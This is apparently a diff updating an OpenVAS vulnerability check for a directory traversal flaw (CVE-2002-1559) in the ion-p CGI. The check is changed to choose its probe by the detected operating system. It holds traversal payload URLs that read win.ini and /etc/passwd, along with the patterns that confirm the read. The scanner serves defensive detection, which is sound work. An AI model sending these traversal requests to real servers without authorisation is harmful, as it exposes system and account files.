@@ -1,8 +1,8 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: ion_p.nasl 4149 2016-09-27 08:27:35Z cfi $
+# $Id: ion_p.nasl 5911 2017-04-10 08:58:14Z cfi $
 #
-# ion-p.exe vulnerability
+# ion-p/ion-p.exe Directory Traversal Vulnerability
 #
 # Authors:
 # John Lampe <j_lampe@bellsouth.net>
@@ -27,32 +27,32 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.11729");
-  script_version("$Revision: 4149 $");
-  script_tag(name:"last_modification", value:"$Date: 2016-09-27 10:27:35 +0200 (Tue, 27 Sep 2016) $");
+  script_version("$Revision: 5911 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-04-10 10:58:14 +0200 (Mon, 10 Apr 2017) $");
   script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
   script_bugtraq_id(6091);
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
   script_cve_id("CVE-2002-1559");
-  script_name("ion-p.exe vulnerability");
-  script_summary("Checks for the ion-p.exe file");
+  script_name("ion-p/ion-p.exe Directory Traversal Vulnerability");
   script_category(ACT_ATTACK);
   script_copyright("This script is Copyright (C) 2003 John Lampe");
   script_family("Web application abuses");
-  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
   tag_summary = "The ion-p.exe exists on this webserver.
-  Some versions of this file are vulnerable to remote exploit.
-  An attacker, exploiting this vulnerability, may be able to gain
-  access to confidential data and/or escalate their privileges on
-  the Web server.";
+  Some versions of this file are vulnerable to remote exploit.";
+
+  tag_impact = "An attacker, exploiting this vulnerability, may be able to gain
+  access to confidential data and/or escalate their privileges on the Web server.";
 
   tag_solution = "Remove it from the cgi-bin or scripts directory.";
 
-  script_tag(name:"solution", value:tag_solution);
   script_tag(name:"summary", value:tag_summary);
+  script_tag(name:"impact", value:tag_impact);
+  script_tag(name:"solution", value:tag_solution);
 
   script_tag(name:"qod_type", value:"remote_vul");
 
@@ -61,26 +61,26 @@ if(description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("host_details.inc");
 
 port = get_http_port( default:80 );
 
 foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
 
   if( dir == "/" ) dir = "";
-  url = dir + "/ion-p.exe?page=c:\\winnt\\win.ini";
 
-  req = http_get( item:url, port:port );
-  res = http_keepalive_send_recv( port:port, data:req );
-
-  if( egrep( pattern:".*\[fonts\].*", string:res, icase:TRUE ) ) {
-    report = report_vuln_url( port:port, url:url );
-    security_message( port:port, data:report );
-    exit( 0 );
+  if( host_runs( "windows" ) == "yes" ) {
+    url = dir + "/ion-p.exe?page=c:\\winnt\\win.ini";
+    pattern = ".*\[fonts\].*";
+  } else if( host_runs( "linux" ) == "yes" ) {
+    url = dir + "/ion-p?page=../../../../../etc/passwd";
+    pattern = ".*root:.*:0:[01]:.*";
+  } else {
+    # This CGI is low prio these days so don't run this test against a system we don't know the OS.
+    exit(0);
   }
 
-  url = dir + "/ion-p.exe?page=../../../../../etc/passwd";
-
-  if( http_vuln_check( port:port, url:url, pattern:".*root:.*:0:[01]:.*" ) ) {
+  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
     report = report_vuln_url( port:port, url:url );
     security_message( port:port, data:report );
     exit( 0 );
